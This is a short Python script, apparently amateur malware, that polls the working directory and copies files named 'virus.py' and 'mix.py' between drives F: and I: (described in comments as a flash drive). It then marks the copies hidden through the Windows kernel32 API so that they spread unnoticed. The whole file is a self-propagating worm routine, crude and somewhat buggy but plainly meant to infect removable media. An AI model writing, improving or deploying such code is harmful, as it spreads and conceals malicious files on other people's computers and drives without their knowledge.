import shutil
import ctypes
import time
import os
timer = 0
while True:
    time.sleep(5)
    pwd = os.getcwd()
    if pwd == 'F:\\':
        timer +=1
        try:
            cp_virus = shutil.copy('virus.py','i:')# it's for copy virus to flash
            cp_mix = shutil.copy('mix.py','i:') #it's for copy mix to flash
        except:
            pass
        ctypes.windll.kernel32.SetFileAttributesW('i:mix.py',2) # it's for select the permision (hidden)
        ctypes.windll.kernel32.SetFileAttributesW('i:virus.py',2)
        print('number of ruinig is >>',timer)
    elif pwd == 'I:\\':
        timer +=2
        try:
            cp_virus = shutil.copy('virus.py','f:')
            cp_mix = shutil.copy('mix.py','f:')
        except:
            pass
    else:
        print('error x400')
    print('...>> ',timer)
